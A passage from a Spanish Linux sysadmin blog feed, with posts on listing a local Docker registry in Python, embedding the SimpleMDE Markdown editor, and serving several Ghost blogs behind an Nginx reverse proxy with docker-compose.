gerard@aldebaran:~/docker/registry$ curl http://localhost:5000/v2/alpine/tags/list
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;alpine&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;:&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;edge&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;3.4&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]}&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ curl http://localhost:5000/v2/debian/tags/list
&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;debian&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;tags&amp;quot;&lt;/span&gt;:&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;jessie&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]}&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se puede automatizar esta salida con un simple &lt;em&gt;script&lt;/em&gt;, que he escrito en &lt;strong&gt;python&lt;/strong&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ cat list_registry.py 
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

import httplib
import json

def get_json_response&lt;span class="o"&gt;(&lt;/span&gt;host, port, uri&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nv"&gt;c&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; httplib.HTTPConnection&lt;span class="o"&gt;(&lt;/span&gt;host, port&lt;span class="o"&gt;)&lt;/span&gt;
    c.request&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, uri&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="nv"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; c.getresponse&lt;span class="o"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; json.load&lt;span class="o"&gt;(&lt;/span&gt;r&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="nv"&gt;catalog&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; get_json_response&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span class="m"&gt;5000&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;/v2/_catalog&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; image in catalog&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;repositories&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;:
    print &lt;span class="s1"&gt;&amp;#39;* %s&amp;#39;&lt;/span&gt; % image
    &lt;span class="nv"&gt;taginfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; get_json_response&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;, &lt;span class="m"&gt;5000&lt;/span&gt;, &lt;span class="s1"&gt;&amp;#39;/v2/%s/tags/list&amp;#39;&lt;/span&gt; % image&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; tag in taginfo&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tags&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;:
        print &lt;span class="s1"&gt;&amp;#39;    * %s:%s&amp;#39;&lt;/span&gt; % &lt;span class="o"&gt;(&lt;/span&gt;taginfo&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;, tag&lt;span class="o"&gt;)&lt;/span&gt;
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto vemos una salida bastante legible.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/registry$ ./list_registry.py 
* alpine
    * alpine:edge
    * alpine:3.4
* debian
    * debian:jessie
gerard@aldebaran:~/docker/registry$ 
&lt;/pre&gt;&lt;/div&gt;</content><category term="registro"></category><category term="docker"></category></entry><entry><title>Un editor Markdown en javascript</title><link href="http://www.linuxsysadmin.ml/2017/01/un-editor-markdown-en-javascript.html" rel="alternate"></link><published>2017-01-02T12:00:00+01:00</published><updated>2017-01-02T12:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-01-02:/2017/01/un-editor-markdown-en-javascript.html</id><summary type="html">&lt;p&gt;Cuando utilizas el lenguaje &lt;strong&gt;markdown&lt;/strong&gt; de forma casi diaria, es muy probable que tengas editores dedicados para tal tarea. Sin embargo, es muy probable que la idea a escribir nos venga mientras estamos utilizando un ordenador distinto del habitual, en el que es posible que no tengamos nuestro editor favorito …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando utilizas el lenguaje &lt;strong&gt;markdown&lt;/strong&gt; de forma casi diaria, es muy probable que tengas editores dedicados para tal tarea. Sin embargo, es muy probable que la idea a escribir nos venga mientras estamos utilizando un ordenador distinto del habitual, en el que es posible que no tengamos nuestro editor favorito.&lt;/p&gt;
&lt;p&gt;Aunque la sintaxis de &lt;strong&gt;markdown&lt;/strong&gt; es tan simple que no se necesita un editor particular, podemos salir del paso con un editor web, de los que existen cientos. Luego podemos transferirnos el resultado usando un servicio en la nube o directamente enviándolo por &lt;em&gt;email&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Si queremos crear un formulario para integrar en una aplicación web, podemos utilizar un complemento &lt;em&gt;javascript&lt;/em&gt; que nos va a convertir un &lt;em&gt;textarea&lt;/em&gt; de HTML en un editor magnífico. Este editor se llama &lt;a href="https://simplemde.com/"&gt;SimpleMDE&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;La misma página web oficial incluye una demostración que nos da una idea de como se vería nuestro editor. Para simplificar este ejemplo, pongo un código HTML mínimo con el esqueleto de la página, con algunos complementos auxiliares activados, así como de la &lt;em&gt;feature&lt;/em&gt; de iluminación de sintaxis.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;meta&lt;/span&gt; &lt;span class="na"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;utf-8&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Markdown editor&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://cdn.jsdelivr.net/simplemde/latest/simplemde.min.css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;stylesheet&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://cdn.jsdelivr.net/highlight.js/latest/styles/github.min.css&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://cdn.jsdelivr.net/simplemde/latest/simplemde.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://cdn.jsdelivr.net/highlight.js/latest/highlight.min.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;style&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;width: 80%; margin: auto;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;Markdown editor&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;h1&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;textarea&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;textarea&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;simplemde&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;SimpleMDE&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;
                &lt;span class="nx"&gt;renderingConfig&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="nx"&gt;codeSyntaxHighlighting&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                &lt;span class="p"&gt;},&lt;/span&gt;
                &lt;span class="nx"&gt;showIcons&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;code&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;table&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
            &lt;span class="p"&gt;});&lt;/span&gt;
        &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por supuesto, los archivos &lt;em&gt;.css&lt;/em&gt; y los &lt;em&gt;.js&lt;/em&gt; se pueden servir localmente, previa descarga, si la situación lo hiciera necesario o recomendable.&lt;/p&gt;
&lt;p&gt;Os pongo una imagen para ver como queda; posiblemente acabe integrado en un proyecto futuro.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Editor SimpleMDE" src="http://www.linuxsysadmin.ml/images/editor_simpleMDE.jpg"&gt;&lt;/p&gt;</content><category term="editor"></category><category term="markdown"></category><category term="javascript"></category></entry><entry><title>Varios blogs de Ghost en el mismo servidor con Docker y Nginx</title><link href="http://www.linuxsysadmin.ml/2016/12/varios-blogs-de-ghost-en-el-mismo-servidor-con-docker-y-nginx.html" rel="alternate"></link><published>2016-12-26T10:00:00+01:00</published><updated>2016-12-26T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-12-26:/2016/12/varios-blogs-de-ghost-en-el-mismo-servidor-con-docker-y-nginx.html</id><summary type="html">&lt;p&gt;Como ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/11/ghost-un-motor-para-hacer-blogs.html"&gt;un artículo anterior&lt;/a&gt; cada instancia de &lt;strong&gt;Ghost&lt;/strong&gt; necesita una combinación de dirección y puerto distinta. Esto supone un problema porque la pesadez de indicar el puerto en el navegador. Podemos poner un único servidor &lt;strong&gt;Nginx&lt;/strong&gt; que redirija las peticiones de forma transparente según el dominio pedido …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2016/11/ghost-un-motor-para-hacer-blogs.html"&gt;un artículo anterior&lt;/a&gt; cada instancia de &lt;strong&gt;Ghost&lt;/strong&gt; necesita una combinación de dirección y puerto distinta. Esto supone un problema porque la pesadez de indicar el puerto en el navegador. Podemos poner un único servidor &lt;strong&gt;Nginx&lt;/strong&gt; que redirija las peticiones de forma transparente según el dominio pedido.&lt;/p&gt;
&lt;p&gt;Ya vimos la facilidad de levantar un contenedor con un &lt;em&gt;blog&lt;/em&gt; de &lt;strong&gt;Ghost&lt;/strong&gt;. De hecho, podemos levantar tantos como queramos, porque &lt;strong&gt;Docker&lt;/strong&gt; provee a cada uno de su propia dirección IP. Sin embargo, la red de contenedores &lt;strong&gt;Docker&lt;/strong&gt; es privada y no es visible para el resto del mundo.&lt;/p&gt;
&lt;p&gt;Podemos solventar este problema exponiendo los puertos en la máquina huésped. Sin embargo, el hecho de que cada usuario tenga que indicar el puerto en la URL no es bonito. Así pues, vamos a esconder todos los contenedores sin exponer sus puertos. La única parte expuesta va a ser un contenedor &lt;strong&gt;Nginx&lt;/strong&gt; representante de todo el sistema (esto es lo que se llama un &lt;em&gt;proxy&lt;/em&gt; reverso), en el puerto 80. Este servicio va a recibir todas las peticiones a nuestro servidor, y las va a dirigir al contenedor que le corresponda de acuerdo con el dominio pedido.&lt;/p&gt;
&lt;p&gt;Vamos a simplificarnos el proceso usando &lt;strong&gt;docker-compose&lt;/strong&gt; para declarar el entorno y levantarlo de un solo comando. Es especialmente importante que las imágenes no se repitan, porque implicaría reconstruirlas cada vez. En vez de eso, vamos a abusar de las configuraciones vía variables de entorno.&lt;/p&gt;
&lt;p&gt;Así nos quedaría la carpeta de proyecto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ tree
.
├── ghost_blog
│   ├── config.js
│   └── Dockerfile
├── proxy
│   ├── Dockerfile
│   ├── entrypoint.sh
│   ├── generate_configs.sh
│   └── nginx.conf
└── docker-compose.yml

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;7&lt;/span&gt; files
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;La imagen de ghost&lt;/h2&gt;
&lt;p&gt;Vamos a hacer una imagen para el entono de producción y vamos a dejar que use su propia base de datos &lt;strong&gt;sqlite&lt;/strong&gt;. Como ya vimos, la configuración por defecto de la imagen para el entorno &lt;em&gt;production&lt;/em&gt; está mal. Incluso aunque estuviera bien, hay parámetros que querremos cambiar, por ejemplo, la URL de nuestra web.&lt;/p&gt;
&lt;p&gt;Por estos problemas, vamos a poner una nueva configuración. Como la imagen oficial no necesita mas cambios, el &lt;em&gt;Dockerfile&lt;/em&gt; se limitará a poner la configuración en su sitio, partiendo de la imagen base.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ cat ghost_blog/Dockerfile 
FROM ghost
COPY config.js /usr/src/ghost/config.example.js
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como no quiero crear una configuración e imagen para cada instancia de &lt;strong&gt;Ghost&lt;/strong&gt;, voy a poner todas las partes diferentes en variables de entorno. El encargado de pasar estas variables de entorno va a ser el fichero &lt;em&gt;docker-compose.yml&lt;/em&gt;, aunque se podría hacer a mano. El mismo intérprete de &lt;strong&gt;nodejs&lt;/strong&gt; permite acceder a las mismas en el fichero &lt;em&gt;config.js&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ cat ghost_blog/config.js 
var &lt;span class="nv"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; require&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;,
    config&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="nv"&gt;config&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    production: &lt;span class="o"&gt;{&lt;/span&gt;
        url: process.env&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;GHOST_URL&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;,
        mail: &lt;span class="o"&gt;{}&lt;/span&gt;,
        database: &lt;span class="o"&gt;{&lt;/span&gt;
            client: &lt;span class="s1"&gt;&amp;#39;sqlite3&amp;#39;&lt;/span&gt;,
            connection: &lt;span class="o"&gt;{&lt;/span&gt;
                filename: path.join&lt;span class="o"&gt;(&lt;/span&gt;__dirname, &lt;span class="s1"&gt;&amp;#39;/content/data/ghost.db&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;,
            debug: &lt;span class="nb"&gt;false&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
        server: &lt;span class="o"&gt;{&lt;/span&gt;
            host: &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;,
            port: &lt;span class="s1"&gt;&amp;#39;2368&amp;#39;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
        paths: &lt;span class="o"&gt;{&lt;/span&gt;
            contentPath: path.join&lt;span class="o"&gt;(&lt;/span&gt;__dirname, &lt;span class="s1"&gt;&amp;#39;/content/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

module.exports &lt;span class="o"&gt;=&lt;/span&gt; config&lt;span class="p"&gt;;&lt;/span&gt;
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La suerte en este caso es que solo hay una parte variable, que es la URL de nuestro sitio.&lt;/p&gt;
&lt;h2&gt;La imagen del proxy HTTP&lt;/h2&gt;
&lt;p&gt;Esta imagen es la de nuestro representante. Va a estar mapeada en el puerto 80 de nuestro servidor y va a recibir todas las peticiones que se nos hagan. Luego las enviará al contenedor responsable y devolverá la respuesta que este genera al usuario final. Podéis pensar en él como un policía de tráfico.&lt;/p&gt;
&lt;p&gt;Nuevamente vamos a tirar de la reusabilidad, definiendo el comportamiento de este &lt;em&gt;proxy&lt;/em&gt; mediante variables de entorno, que nos va a evitar reconstruirlo cada vez que añadamos mas &lt;em&gt;blogs&lt;/em&gt;. La técnica de las plantillas para su configuración se vio en &lt;a href="http://www.linuxsysadmin.ml/2016/09/imagenes-docker-reusables-mediante-configuraciones-dinamicas.html"&gt;otro artículo&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Hacemos un &lt;em&gt;Dockerfile&lt;/em&gt; propio, partiendo de una imagen mínima, a la que instalaremos &lt;strong&gt;nginx&lt;/strong&gt; y sus configuraciones.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ cat proxy/Dockerfile 
FROM alpine:3.4
RUN apk add --no-cache nginx &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stdout /var/log/nginx/access.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    ln -s /dev/stderr /var/log/nginx/error.log &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    mkdir /run/nginx
COPY nginx.conf /etc/nginx/
COPY generate_configs.sh entrypoint.sh /
ENTRYPOINT &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/entrypoint.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo falta poner la configuración general, el punto de acceso al contenedor y el generador de configuraciones específicas según las variables de entorno.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@sirius:~/docker/multighost$ cat proxy/nginx.conf 
worker_processes  &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
events &lt;span class="o"&gt;{&lt;/span&gt;
    worker_connections  &lt;span class="m"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
http &lt;span class="o"&gt;{&lt;/span&gt;
    include mime.types&lt;span class="p"&gt;;&lt;/span&gt;
    default_type application/octet-stream&lt;span class="p"&gt;;&lt;/span&gt;
    sendfile on&lt;span class="p"&gt;;&lt;/span&gt;
    keepalive_timeout &lt;span class="m"&gt;65&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    include conf.d/*&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@sirius:~/docker/multighost$ cat proxy/generate_configs.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; LINE in &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;DOMAINS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sed &lt;span class="s1"&gt;&amp;#39;s/;/ /g&amp;#39;&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="nv"&gt;DOMAIN&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$LINE&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d, -f1&lt;span class="k"&gt;)&lt;/span&gt;
    &lt;span class="nv"&gt;BACKEND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$LINE&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; cut -d, -f2&lt;span class="k"&gt;)&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;\&lt;/span&gt;
&lt;span class="s2"&gt;server {&lt;/span&gt;
&lt;span class="s2"&gt;    listen 80;&lt;/span&gt;
&lt;span class="s2"&gt;    server_name &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;DOMAIN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;;&lt;/span&gt;
&lt;span class="s2"&gt;    location / {&lt;/span&gt;
&lt;span class="s2"&gt;        proxy_pass http://&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;BACKEND&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;:2368;&lt;/span&gt;
&lt;span class="s2"&gt;    }&lt;/span&gt;
&lt;span class="s2"&gt;}&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &amp;gt; /etc/nginx/conf.d/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;DOMAIN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
gerard@sirius:~/docker/multighost$ cat proxy/entrypoint.sh 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

/generate_configs.sh
&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/nginx -g &lt;span class="s2"&gt;&amp;quot;daemon off;&amp;quot;&lt;/span&gt;
gerard@sirius:~/docker/multighost$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como apunte, cabe decir que la configuración se genera a partir de la variable de entorno DOMAINS, que no es otra cosa que pares de dominio y &lt;em&gt;backend&lt;/em&gt; (separados por una coma). Estos pares se separan de otros pares mediante el uso de un punto y coma.&lt;/p&gt;
&lt;h2&gt;Declarando el entorno&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que tenemos dos dominios &lt;em&gt;ghost1.my&lt;/em&gt; y &lt;em&gt;ghost2.my&lt;/em&gt;. Como no los tengo de verdad, he usado el fichero &lt;em&gt;/etc/hosts&lt;/em&gt; para que acaben en mi local, asignándoles la dirección IP 127.0.0.1.&lt;/p&gt;
&lt;p&gt;Vamos a tener que declarar un servicio de &lt;em&gt;proxy&lt;/em&gt; y dos de &lt;strong&gt;ghost&lt;/strong&gt;. El motivo es porque todos los contenedores del mismo servicio heredan las mismas variables de entorno, con lo que eso de &lt;em&gt;escalar&lt;/em&gt; no vale. Vamos a llamar a estos servicios &lt;em&gt;ghost1&lt;/em&gt; y &lt;em&gt;ghost2&lt;/em&gt;, aunque el nombre es arbitrario.&lt;/p&gt;
&lt;p&gt;Otro tema puntiagudo son los nombres de los &lt;em&gt;backends&lt;/em&gt;. De acuerdo con la convención usada por &lt;strong&gt;docker-compose&lt;/strong&gt;, una instancia se llama {carpeta contenedora}_{nombre del servicio}_{numero de instancia}. Eso significa que los contenedores de los dos &lt;em&gt;blogs&lt;/em&gt; van a llamarse &lt;em&gt;multighost_ghost1_1&lt;/em&gt; y &lt;em&gt;multighost_ghost2_1&lt;/em&gt; respectivamente.&lt;/p&gt;
